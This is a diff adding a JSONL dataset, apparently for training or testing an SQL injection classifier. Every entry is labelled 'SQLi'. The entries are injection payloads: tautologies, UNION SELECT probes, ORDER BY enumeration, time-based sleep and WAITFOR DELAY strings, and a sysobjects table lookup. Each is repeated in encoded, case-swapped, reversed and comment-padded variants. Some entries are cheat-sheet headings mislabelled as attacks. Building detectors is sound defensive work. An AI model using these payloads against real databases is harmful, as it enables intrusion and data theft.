@@ -1,0 +1,371 @@
+{"input": "%27", "label": "SQLi"}
+{"input": "/*start*/'/*end*/", "label": "SQLi"}
+{"input": "'/*random*/", "label": "SQLi"}
+{"input": "'", "label": "SQLi"}
+{"input": "''/**/", "label": "SQLi"}
+{"input": "/*start*/''/*end*/", "label": "SQLi"}
+{"input": "''", "label": "SQLi"}
+{"input": "%27%27", "label": "SQLi"}
+{"input": "%60", "label": "SQLi"}
+{"input": "/*start*/`/*end*/", "label": "SQLi"}
+{"input": "`/*random*/", "label": "SQLi"}
+{"input": "`", "label": "SQLi"}
+{"input": "``/*random*/", "label": "SQLi"}
+{"input": "%60%60", "label": "SQLi"}
+{"input": "/*start*/``/*end*/", "label": "SQLi"}
+{"input": "``", "label": "SQLi"}
+{"input": "%2C", "label": "SQLi"}
+{"input": ",", "label": "SQLi"}
+{"input": ",%0a", "label": "SQLi"}
+{"input": "/*start*/,/*end*/", "label": "SQLi"}
+{"input": "%22", "label": "SQLi"}
+{"input": "\"", "label": "SQLi"}
+{"input": "/*start*/\"/*end*/", "label": "SQLi"}
+{"input": "\"%0a", "label": "SQLi"}
+{"input": "\"\"%0d", "label": "SQLi"}
+{"input": "/*start*/\"\"/*end*/", "label": "SQLi"}
+{"input": "%22%22", "label": "SQLi"}
+{"input": "\"\"", "label": "SQLi"}
+{"input": "/%09", "label": "SQLi"}
+{"input": "/*start*///*end*/", "label": "SQLi"}
+{"input": "/", "label": "SQLi"}
+{"input": "/*start*////*end*/", "label": "SQLi"}
+{"input": "//", "label": "SQLi"}
+{"input": "///**/", "label": "SQLi"}
+{"input": "/*start*/\\/*end*/", "label": "SQLi"}
+{"input": "\\%09", "label": "SQLi"}
+{"input": "%5C", "label": "SQLi"}
+{"input": "\\", "label": "SQLi"}
+{"input": "/*start*/\\\\/*end*/", "label": "SQLi"}
+{"input": "\\\\", "label": "SQLi"}
+{"input": "\\\\/*random*/", "label": "SQLi"}
+{"input": "%5C%5C", "label": "SQLi"}
+{"input": ";", "label": "SQLi"}
+{"input": "%3B", "label": "SQLi"}
+{"input": "/*start*/;/*end*/", "label": "SQLi"}
+{"input": ";%09", "label": "SQLi"}
+{"input": "' Or \"", "label": "SQLi"}
+{"input": "' or \"", "label": "SQLi"}
+{"input": "'/*random*/ or%0a \"%0d", "label": "SQLi"}
+{"input": "\" ro '", "label": "SQLi"}
+{"input": "%27%20or%20%22", "label": "SQLi"}
+{"input": "/*start*/' or \"/*end*/", "label": "SQLi"}
+{"input": "--%20or%20%23", "label": "SQLi"}
+{"input": "# ro --", "label": "SQLi"}
+{"input": "--%0a or%09 #/*random*/", "label": "SQLi"}
+{"input": "/*start*/-- or #/*end*/", "label": "SQLi"}
+{"input": "-- or #", "label": "SQLi"}
+{"input": "-- oR #", "label": "SQLi"}
+{"input": "1' RO '", "label": "SQLi"}
+{"input": "' OR '1", "label": "SQLi"}
+{"input": "'/*random*/ OR/**/ '1%0a", "label": "SQLi"}
+{"input": "/*start*/' OR '1/*end*/", "label": "SQLi"}
+{"input": "' Or '1", "label": "SQLi"}
+{"input": "%27%20OR%20%271", "label": "SQLi"}
+{"input": "' Or 1 -- -", "label": "SQLi"}
+{"input": "/*start*/' OR 1 -- -/*end*/", "label": "SQLi"}
+{"input": "'%0a OR%0a 1/*random*/ --/*random*/ -%0a", "label": "SQLi"}
+{"input": "%27%20OR%201%20--%20-", "label": "SQLi"}
+{"input": "' OR 1 -- -", "label": "SQLi"}
+{"input": "- -- 1 RO '", "label": "SQLi"}
+{"input": "\" OR \"\" = \"", "label": "SQLi"}
+{"input": "\"%09 OR/**/ \"\"/**/ =%0a \"%0a", "label": "SQLi"}
+{"input": "\" Or \"\" = \"", "label": "SQLi"}
+{"input": "/*start*/\" OR \"\" = \"/*end*/", "label": "SQLi"}
+{"input": "\" = \"\" RO \"", "label": "SQLi"}
+{"input": "%22%20OR%20%22%22%20%3D%20%22", "label": "SQLi"}
+{"input": "\" OR 1 = 1 -- -", "label": "SQLi"}
+{"input": "/*start*/\" OR 1 = 1 -- -/*end*/", "label": "SQLi"}
+{"input": "- -- 1 = 1 RO \"", "label": "SQLi"}
+{"input": "\"%09 OR/**/ 1%0a =%0d 1%0d --%09 -%0d", "label": "SQLi"}
+{"input": "%22%20OR%201%20%3D%201%20--%20-", "label": "SQLi"}
+{"input": "\" Or 1 = 1 -- -", "label": "SQLi"}
+{"input": "'%0d OR/*random*/ ''/*random*/ =%09 '/**/", "label": "SQLi"}
+{"input": "/*start*/' OR '' = '/*end*/", "label": "SQLi"}
+{"input": "%27%20OR%20%27%27%20%3D%20%27", "label": "SQLi"}
+{"input": "' OR '' = '", "label": "SQLi"}
+{"input": "' = '' RO '", "label": "SQLi"}
+{"input": "' Or '' = '", "label": "SQLi"}
+{"input": "/*start*/'='/*end*/", "label": "SQLi"}
+{"input": "'='%0d", "label": "SQLi"}
+{"input": "%27%3D%27", "label": "SQLi"}
+{"input": "'='", "label": "SQLi"}
+{"input": "'LIKE'", "label": "SQLi"}
+{"input": "'LIKE'%0a", "label": "SQLi"}
+{"input": "'EKIL'", "label": "SQLi"}
+{"input": "%27LIKE%27", "label": "SQLi"}
+{"input": "/*start*/'LIKE'/*end*/", "label": "SQLi"}
+{"input": "'lIkE'", "label": "SQLi"}
+{"input": "'=0--+", "label": "SQLi"}
+{"input": "/*start*/'=0--+/*end*/", "label": "SQLi"}
+{"input": "%27%3D0--%2B", "label": "SQLi"}
+{"input": "'=0--+%09", "label": "SQLi"}
+{"input": "+--0='", "label": "SQLi"}
+{"input": "OR%201%3D1", "label": "SQLi"}
+{"input": "OR 1=1", "label": "SQLi"}
+{"input": "Or 1=1", "label": "SQLi"}
+{"input": "1=1 RO", "label": "SQLi"}
+{"input": "/*start*/OR 1=1/*end*/", "label": "SQLi"}
+{"input": "OR/**/ 1=1%0d", "label": "SQLi"}
+{"input": "'%0d OR/**/ 'x'='x%0a", "label": "SQLi"}
+{"input": "/*start*/' OR 'x'='x/*end*/", "label": "SQLi"}
+{"input": "' Or 'X'='X", "label": "SQLi"}
+{"input": "x'='x' RO '", "label": "SQLi"}
+{"input": "' OR 'x'='x", "label": "SQLi"}
+{"input": "%27%20OR%20%27x%27%3D%27x", "label": "SQLi"}
+{"input": "' AND id IS NULL; --", "label": "SQLi"}
+{"input": "%27%20AND%20id%20IS%20NULL%3B%20--", "label": "SQLi"}
+{"input": "-- ;LLUN SI di DNA '", "label": "SQLi"}
+{"input": "/*start*/' AND id IS NULL; --/*end*/", "label": "SQLi"}
+{"input": "' AnD Id iS NuLl; --", "label": "SQLi"}
+{"input": "'%09 AND/**/ id/**/ IS/*random*/ NULL;%0a --%09", "label": "SQLi"}
+{"input": "/*start*/'''''''''''''UNION SELECT '2/*end*/", "label": "SQLi"}
+{"input": "'''''''''''''uNiOn sElEcT '2", "label": "SQLi"}
+{"input": "'''''''''''''UNION/**/ SELECT%0d '2/**/", "label": "SQLi"}
+{"input": "%27%27%27%27%27%27%27%27%27%27%27%27%27UNION%20SELECT%20%272", "label": "SQLi"}
+{"input": "'''''''''''''UNION SELECT '2", "label": "SQLi"}
+{"input": "2' TCELES NOINU'''''''''''''", "label": "SQLi"}
+{"input": "%2500", "label": "SQLi"}
+{"input": "%00%09", "label": "SQLi"}
+{"input": "%00", "label": "SQLi"}
+{"input": "/*start*/%00/*end*/", "label": "SQLi"}
+{"input": "00%", "label": "SQLi"}
+{"input": "/*\u2026*/", "label": "SQLi"}
+{"input": "/*start*//*\u2026*//*end*/", "label": "SQLi"}
+{"input": "/%2A%E2%80%A6%2A/", "label": "SQLi"}
+{"input": "/*\u2026*//*random*/", "label": "SQLi"}
+{"input": "%2B%20%20%20%20%20%20%20%20addition%2C%20concatenate%20%28or%20space%20in%20url%29", "label": "SQLi"}
+{"input": "+        aDdItIoN, cOnCaTeNaTe (Or sPaCe iN UrL)", "label": "SQLi"}
+{"input": ")lru ni ecaps ro( etanetacnoc ,noitidda        +", "label": "SQLi"}
+{"input": "/*start*/+        addition, concatenate (or space in url)/*end*/", "label": "SQLi"}
+{"input": "+        addition, concatenate (or space in url)", "label": "SQLi"}
+{"input": "+/**/ %09 %0a %0a /**/ %09 /*random*/ %0d addition,%0d concatenate%09 (or/**/ space%0d in%0a url)%0a", "label": "SQLi"}
+{"input": "||        (dOuBlE PiPe) CoNcAtEnAtE", "label": "SQLi"}
+{"input": "%7C%7C%20%20%20%20%20%20%20%20%28double%20pipe%29%20concatenate", "label": "SQLi"}
+{"input": "etanetacnoc )epip elbuod(        ||", "label": "SQLi"}
+{"input": "||%0d %09 %0d /**/ %0a /*random*/ %0a %0a (double%0a pipe)%09 concatenate%0d", "label": "SQLi"}
+{"input": "||        (double pipe) concatenate", "label": "SQLi"}
+{"input": "/*start*/||        (double pipe) concatenate/*end*/", "label": "SQLi"}
+{"input": "%/*random*/ %09 %0d %09 %0a /*random*/ /**/ %0d wildcard%09 attribute%0a indicator%0d", "label": "SQLi"}
+{"input": "%        wildcard attribute indicator", "label": "SQLi"}
+{"input": "%        wIlDcArD AtTrIbUtE InDiCaToR", "label": "SQLi"}
+{"input": "rotacidni etubirtta dracdliw        %", "label": "SQLi"}
+{"input": "%25%20%20%20%20%20%20%20%20wildcard%20attribute%20indicator", "label": "SQLi"}
+{"input": "/*start*/%        wildcard attribute indicator/*end*/", "label": "SQLi"}
+{"input": "@variable    local variable", "label": "SQLi"}
+{"input": "@variable/*random*/ %0d /*random*/ %0d local/**/ variable%09", "label": "SQLi"}
+{"input": "%40variable%20%20%20%20local%20variable", "label": "SQLi"}
+{"input": "elbairav lacol    elbairav@", "label": "SQLi"}
+{"input": "@vArIaBlE    lOcAl vArIaBlE", "label": "SQLi"}
+{"input": "/*start*/@variable    local variable/*end*/", "label": "SQLi"}
+{"input": "@@VaRiAbLe    GlObAl vArIaBlE", "label": "SQLi"}
+{"input": "%40%40variable%20%20%20%20global%20variable", "label": "SQLi"}
+{"input": "@@variable/*random*/ /**/ %0d /**/ global%09 variable/**/", "label": "SQLi"}
+{"input": "/*start*/@@variable    global variable/*end*/", "label": "SQLi"}
+{"input": "@@variable    global variable", "label": "SQLi"}
+{"input": "elbairav labolg    elbairav@@", "label": "SQLi"}
+{"input": "/*start*/# Numeric/*end*/", "label": "SQLi"}
+{"input": "%23%20Numeric", "label": "SQLi"}
+{"input": "#%09 Numeric/*random*/", "label": "SQLi"}
+{"input": "# Numeric", "label": "SQLi"}
+{"input": "# NuMeRiC", "label": "SQLi"}
+{"input": "ciremuN #", "label": "SQLi"}
+{"input": "/*start*/AND 1/*end*/", "label": "SQLi"}
+{"input": "AND/**/ 1%0a", "label": "SQLi"}
+{"input": "AnD 1", "label": "SQLi"}
+{"input": "AND%201", "label": "SQLi"}
+{"input": "1 DNA", "label": "SQLi"}
+{"input": "AND 1", "label": "SQLi"}
+{"input": "AND%200", "label": "SQLi"}
+{"input": "/*start*/AND 0/*end*/", "label": "SQLi"}
+{"input": "0 DNA", "label": "SQLi"}
+{"input": "AND/**/ 0%0a", "label": "SQLi"}
+{"input": "AND 0", "label": "SQLi"}
+{"input": "AnD 0", "label": "SQLi"}
+{"input": "eurt DNA", "label": "SQLi"}
+{"input": "AND%09 true%0d", "label": "SQLi"}
+{"input": "AND true", "label": "SQLi"}
+{"input": "AND%20true", "label": "SQLi"}
+{"input": "/*start*/AND true/*end*/", "label": "SQLi"}
+{"input": "AnD TrUe", "label": "SQLi"}
+{"input": "AND false", "label": "SQLi"}
+{"input": "AnD FaLsE", "label": "SQLi"}
+{"input": "AND%0d false%0d", "label": "SQLi"}
+{"input": "/*start*/AND false/*end*/", "label": "SQLi"}
+{"input": "AND%20false", "label": "SQLi"}
+{"input": "eslaf DNA", "label": "SQLi"}
+{"input": "1-false", "label": "SQLi"}
+{"input": "eslaf-1", "label": "SQLi"}
+{"input": "1-FaLsE", "label": "SQLi"}
+{"input": "/*start*/1-false/*end*/", "label": "SQLi"}
+{"input": "1-false/**/", "label": "SQLi"}
+{"input": "eurt-1", "label": "SQLi"}
+{"input": "1-true/*random*/", "label": "SQLi"}
+{"input": "/*start*/1-true/*end*/", "label": "SQLi"}
+{"input": "1-TrUe", "label": "SQLi"}
+{"input": "1-true", "label": "SQLi"}
+{"input": "1%2A56", "label": "SQLi"}
+{"input": "65*1", "label": "SQLi"}
+{"input": "/*start*/1*56/*end*/", "label": "SQLi"}
+{"input": "1*56", "label": "SQLi"}
+{"input": "1*56/*random*/", "label": "SQLi"}
+{"input": "-2", "label": "SQLi"}
+{"input": "/*start*/-2/*end*/", "label": "SQLi"}
+{"input": "2-", "label": "SQLi"}
+{"input": "-2%0a", "label": "SQLi"}
+{"input": "1' oRdEr bY 1--+", "label": "SQLi"}
+{"input": "1' ORDER BY 1--+", "label": "SQLi"}
+{"input": "1'%09 ORDER/*random*/ BY%0d 1--+/**/", "label": "SQLi"}
+{"input": "1%27%20ORDER%20BY%201--%2B", "label": "SQLi"}
+{"input": "/*start*/1' ORDER BY 1--+/*end*/", "label": "SQLi"}
+{"input": "+--1 YB REDRO '1", "label": "SQLi"}
+{"input": "1'/*random*/ ORDER%0a BY/*random*/ 2--+/**/", "label": "SQLi"}
+{"input": "1' oRdEr bY 2--+", "label": "SQLi"}
+{"input": "1' ORDER BY 2--+", "label": "SQLi"}
+{"input": "/*start*/1' ORDER BY 2--+/*end*/", "label": "SQLi"}
+{"input": "1%27%20ORDER%20BY%202--%2B", "label": "SQLi"}
+{"input": "+--2 YB REDRO '1", "label": "SQLi"}
+{"input": "1' ORDER BY 3--+", "label": "SQLi"}
+{"input": "1%27%20ORDER%20BY%203--%2B", "label": "SQLi"}
+{"input": "/*start*/1' ORDER BY 3--+/*end*/", "label": "SQLi"}
+{"input": "1' oRdEr bY 3--+", "label": "SQLi"}
+{"input": "+--3 YB REDRO '1", "label": "SQLi"}
+{"input": "1'%0d ORDER%0a BY%09 3--+%09", "label": "SQLi"}
+{"input": "1%27%20ORDER%20BY%201%2C2--%2B", "label": "SQLi"}
+{"input": "1' ORDER BY 1,2--+", "label": "SQLi"}
+{"input": "1' oRdEr bY 1,2--+", "label": "SQLi"}
+{"input": "+--2,1 YB REDRO '1", "label": "SQLi"}
+{"input": "/*start*/1' ORDER BY 1,2--+/*end*/", "label": "SQLi"}
+{"input": "1'%0a ORDER/*random*/ BY/**/ 1,2--+%0d", "label": "SQLi"}
+{"input": "/*start*/1' ORDER BY 1,2,3--+/*end*/", "label": "SQLi"}
+{"input": "+--3,2,1 YB REDRO '1", "label": "SQLi"}
+{"input": "1'%0d ORDER%0a BY%0d 1,2,3--+/**/", "label": "SQLi"}
+{"input": "1' ORDER BY 1,2,3--+", "label": "SQLi"}
+{"input": "1%27%20ORDER%20BY%201%2C2%2C3--%2B", "label": "SQLi"}
+{"input": "1' oRdEr bY 1,2,3--+", "label": "SQLi"}
+{"input": "1'/**/ GROUP%09 BY/*random*/ 1,2,--+%0d", "label": "SQLi"}
+{"input": "1' GROUP BY 1,2,--+", "label": "SQLi"}
+{"input": "1%27%20GROUP%20BY%201%2C2%2C--%2B", "label": "SQLi"}
+{"input": "/*start*/1' GROUP BY 1,2,--+/*end*/", "label": "SQLi"}
+{"input": "+--,2,1 YB PUORG '1", "label": "SQLi"}
+{"input": "1' gRoUp bY 1,2,--+", "label": "SQLi"}
+{"input": "/*start*/1' GROUP BY 1,2,3--+/*end*/", "label": "SQLi"}
+{"input": "1' GROUP BY 1,2,3--+", "label": "SQLi"}
+{"input": "1' gRoUp bY 1,2,3--+", "label": "SQLi"}
+{"input": "+--3,2,1 YB PUORG '1", "label": "SQLi"}
+{"input": "1'%0a GROUP/**/ BY/**/ 1,2,3--+%09", "label": "SQLi"}
+{"input": "1%27%20GROUP%20BY%201%2C2%2C3--%2B", "label": "SQLi"}
+{"input": "/*start*/' GROUP BY columnnames having 1=1 --/*end*/", "label": "SQLi"}
+{"input": "'/**/ GROUP%09 BY/*random*/ columnnames/**/ having/**/ 1=1%0d --%09", "label": "SQLi"}
+{"input": "' GrOuP By cOlUmNnAmEs hAvInG 1=1 --", "label": "SQLi"}
+{"input": "%27%20GROUP%20BY%20columnnames%20having%201%3D1%20--", "label": "SQLi"}
+{"input": "-- 1=1 gnivah semannmuloc YB PUORG '", "label": "SQLi"}
+{"input": "' GROUP BY columnnames having 1=1 --", "label": "SQLi"}
+{"input": "/*start*/-1' UNION SELECT 1,2,3--+/*end*/", "label": "SQLi"}
+{"input": "+--3,2,1 TCELES NOINU '1-", "label": "SQLi"}
+{"input": "-1' UNION SELECT 1,2,3--+", "label": "SQLi"}
+{"input": "-1%27%20UNION%20SELECT%201%2C2%2C3--%2B", "label": "SQLi"}
+{"input": "-1'%09 UNION%0d SELECT%09 1,2,3--+%0a", "label": "SQLi"}
+{"input": "-1' UnIoN SeLeCt 1,2,3--+", "label": "SQLi"}
+{"input": "'%0a UNION%0d SELECT%09 sum(columnname%0d )%0d from%09 tablename%0a --/*random*/", "label": "SQLi"}
+{"input": "/*start*/' UNION SELECT sum(columnname ) from tablename --/*end*/", "label": "SQLi"}
+{"input": "%27%20UNION%20SELECT%20sum%28columnname%20%29%20from%20tablename%20--", "label": "SQLi"}
+{"input": "' UnIoN SeLeCt sUm(cOlUmNnAmE ) FrOm tAbLeNaMe --", "label": "SQLi"}
+{"input": "' UNION SELECT sum(columnname ) from tablename --", "label": "SQLi"}
+{"input": "-- emanelbat morf ) emannmuloc(mus TCELES NOINU '", "label": "SQLi"}
+{"input": "-1%20UNION%20SELECT%201%20INTO%20%40%2C%40", "label": "SQLi"}
+{"input": "@,@ OTNI 1 TCELES NOINU 1-", "label": "SQLi"}
+{"input": "-1 uNiOn sElEcT 1 InTo @,@", "label": "SQLi"}
+{"input": "-1%09 UNION%0a SELECT%09 1/**/ INTO/**/ @,@%09", "label": "SQLi"}
+{"input": "/*start*/-1 UNION SELECT 1 INTO @,@/*end*/", "label": "SQLi"}
+{"input": "-1 UNION SELECT 1 INTO @,@", "label": "SQLi"}
+{"input": "-1 uNiOn sElEcT 1 InTo @,@,@", "label": "SQLi"}
+{"input": "/*start*/-1 UNION SELECT 1 INTO @,@,@/*end*/", "label": "SQLi"}
+{"input": "-1%20UNION%20SELECT%201%20INTO%20%40%2C%40%2C%40", "label": "SQLi"}
+{"input": "-1 UNION SELECT 1 INTO @,@,@", "label": "SQLi"}
+{"input": "-1%0d UNION/**/ SELECT/**/ 1/*random*/ INTO/**/ @,@,@%0d", "label": "SQLi"}
+{"input": "@,@,@ OTNI 1 TCELES NOINU 1-", "label": "SQLi"}
+{"input": "1 AnD (sElEcT * FrOm uSeRs) = 1", "label": "SQLi"}
+{"input": "1%0d AND%0d (SELECT/**/ */**/ FROM%0d Users)/**/ =%09 1%09", "label": "SQLi"}
+{"input": "/*start*/1 AND (SELECT * FROM Users) = 1/*end*/", "label": "SQLi"}
+{"input": "1 AND (SELECT * FROM Users) = 1", "label": "SQLi"}
+{"input": "1 = )sresU MORF * TCELES( DNA 1", "label": "SQLi"}
+{"input": "1%20AND%20%28SELECT%20%2A%20FROM%20Users%29%20%3D%201", "label": "SQLi"}
+{"input": "'/*random*/ AND%09 MID(VERSION(),1,1)/**/ =%09 '5';%09", "label": "SQLi"}
+{"input": "%27%20AND%20MID%28VERSION%28%29%2C1%2C1%29%20%3D%20%275%27%3B", "label": "SQLi"}
+{"input": "/*start*/' AND MID(VERSION(),1,1) = '5';/*end*/", "label": "SQLi"}
+{"input": ";'5' = )1,1,)(NOISREV(DIM DNA '", "label": "SQLi"}
+{"input": "' AnD MiD(VeRsIoN(),1,1) = '5';", "label": "SQLi"}
+{"input": "' AND MID(VERSION(),1,1) = '5';", "label": "SQLi"}
+{"input": "' AnD 1 In (SeLeCt mIn(nAmE) fRoM SySoBjEcTs wHeRe xTyPe = 'U' aNd nAmE > '.') --", "label": "SQLi"}
+{"input": "'%09 and%0a 1%09 in%0d (select%0a min(name)/*random*/ from/**/ sysobjects%0d where%0a xtype/*random*/ =%0d 'U'/**/ and/*random*/ name%0a >%0d '.')%09 --/*random*/", "label": "SQLi"}
+{"input": "%27%20and%201%20in%20%28select%20min%28name%29%20from%20sysobjects%20where%20xtype%20%3D%20%27U%27%20and%20name%20%3E%20%27.%27%29%20--", "label": "SQLi"}
+{"input": "-- )'.' > eman dna 'U' = epytx erehw stcejbosys morf )eman(nim tceles( ni 1 dna '", "label": "SQLi"}
+{"input": "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --", "label": "SQLi"}
+{"input": "/*start*/' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --/*end*/", "label": "SQLi"}
+{"input": "FiNdInG ThE TaBlE NaMe", "label": "SQLi"}
+{"input": "/*start*/Finding the table name/*end*/", "label": "SQLi"}
+{"input": "eman elbat eht gnidniF", "label": "SQLi"}
+{"input": "Finding the table name", "label": "SQLi"}
+{"input": "Finding%20the%20table%20name", "label": "SQLi"}
+{"input": "Finding%09 the%0d table%0d name%09", "label": "SQLi"}
+{"input": ":desaB-emiT", "label": "SQLi"}
+{"input": "/*start*/Time-Based:/*end*/", "label": "SQLi"}
+{"input": "Time-Based:", "label": "SQLi"}
+{"input": "Time-Based:/**/", "label": "SQLi"}
+{"input": "TiMe-bAsEd:", "label": "SQLi"}
+{"input": "Time-Based%3A", "label": "SQLi"}
+{"input": ")a)))01(peels(tceles( morf * tceles(,", "label": "SQLi"}
+{"input": ",(select * from (select(sleep(10)))a)", "label": "SQLi"}
+{"input": "%2C%28select%20%2A%20from%20%28select%28sleep%2810%29%29%29a%29", "label": "SQLi"}
+{"input": ",(SeLeCt * fRoM (sElEcT(SlEeP(10)))a)", "label": "SQLi"}
+{"input": "/*start*/,(select * from (select(sleep(10)))a)/*end*/", "label": "SQLi"}
+{"input": ",(select%09 */*random*/ from/**/ (select(sleep(10)))a)/**/", "label": "SQLi"}
+{"input": "/*start*/%2c(select%20*%20from%20(select(sleep(10)))a)/*end*/", "label": "SQLi"}
+{"input": "%2c(select%20*%20from%20(select(sleep(10)))a)", "label": "SQLi"}
+{"input": "%252c%28select%2520%2A%2520from%2520%28select%28sleep%2810%29%29%29a%29", "label": "SQLi"}
+{"input": "%2c(select%20*%20from%20(select(sleep(10)))a)%0a", "label": "SQLi"}
+{"input": "%2C(SeLeCt%20*%20fRoM%20(sElEcT(SlEeP(10)))a)", "label": "SQLi"}
+{"input": ")a)))01(peels(tceles(02%morf02%*02%tceles(c2%", "label": "SQLi"}
+{"input": "%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27--", "label": "SQLi"}
+{"input": "';WAITFOR DELAY '0:0:30'--", "label": "SQLi"}
+{"input": "';WAITFOR/*random*/ DELAY/**/ '0:0:30'--/*random*/", "label": "SQLi"}
+{"input": "--'03:0:0' YALED ROFTIAW;'", "label": "SQLi"}
+{"input": "';WaItFoR DeLaY '0:0:30'--", "label": "SQLi"}
+{"input": "/*start*/';WAITFOR DELAY '0:0:30'--/*end*/", "label": "SQLi"}
+{"input": "Comments:", "label": "SQLi"}
+{"input": "Comments%3A", "label": "SQLi"}
+{"input": "Comments:/*random*/", "label": "SQLi"}
+{"input": "CoMmEnTs:", "label": "SQLi"}
+{"input": ":stnemmoC", "label": "SQLi"}
+{"input": "/*start*/Comments:/*end*/", "label": "SQLi"}
+{"input": "tnemmoc hsaH        #", "label": "SQLi"}
+{"input": "#        Hash comment", "label": "SQLi"}
+{"input": "/*start*/#        Hash comment/*end*/", "label": "SQLi"}
+{"input": "#%09 %0a %0a /**/ %09 %0d %0a /**/ Hash/**/ comment%0d", "label": "SQLi"}
+{"input": "%23%20%20%20%20%20%20%20%20Hash%20comment", "label": "SQLi"}
+{"input": "#        hAsH CoMmEnT", "label": "SQLi"}
+{"input": "/*      C-style comment", "label": "SQLi"}
+{"input": "/*      C-StYlE CoMmEnT", "label": "SQLi"}
+{"input": "/*start*//*      C-style comment/*end*/", "label": "SQLi"}
+{"input": "/*%09 /**/ /*random*/ /*random*/ %0d /**/ C-style/**/ comment%0a", "label": "SQLi"}
+{"input": "/%2A%20%20%20%20%20%20C-style%20comment", "label": "SQLi"}
+{"input": "tnemmoc elyts-C      */", "label": "SQLi"}
+{"input": "/*start*/-- -    SQL comment/*end*/", "label": "SQLi"}
+{"input": "-- -    SQL comment", "label": "SQLi"}
+{"input": "--%20-%20%20%20%20SQL%20comment", "label": "SQLi"}
+{"input": "tnemmoc LQS    - --", "label": "SQLi"}
+{"input": "--%0d -%0d %0d %0d /**/ SQL/*random*/ comment%0a", "label": "SQLi"}
+{"input": "-- -    SqL CoMmEnT", "label": "SQLi"}
+{"input": "/*start*/;%00    Nullbyte/*end*/", "label": "SQLi"}
+{"input": "etyblluN    00%;", "label": "SQLi"}
+{"input": ";%00    NuLlByTe", "label": "SQLi"}
+{"input": ";%00%09 /**/ /*random*/ %09 Nullbyte%09", "label": "SQLi"}
+{"input": ";%00    Nullbyte", "label": "SQLi"}
+{"input": "%3B%2500%20%20%20%20Nullbyte", "label": "SQLi"}
+{"input": "kcitkcaB        `", "label": "SQLi"}
+{"input": "/*start*/`        Backtick/*end*/", "label": "SQLi"}
+{"input": "%60%20%20%20%20%20%20%20%20Backtick", "label": "SQLi"}
+{"input": "`        Backtick", "label": "SQLi"}
+{"input": "`%0a %09 /**/ %09 %0d %09 %0d /*random*/ Backtick%0d", "label": "SQLi"}
+{"input": "`        bAcKtIcK", "label": "SQLi"}
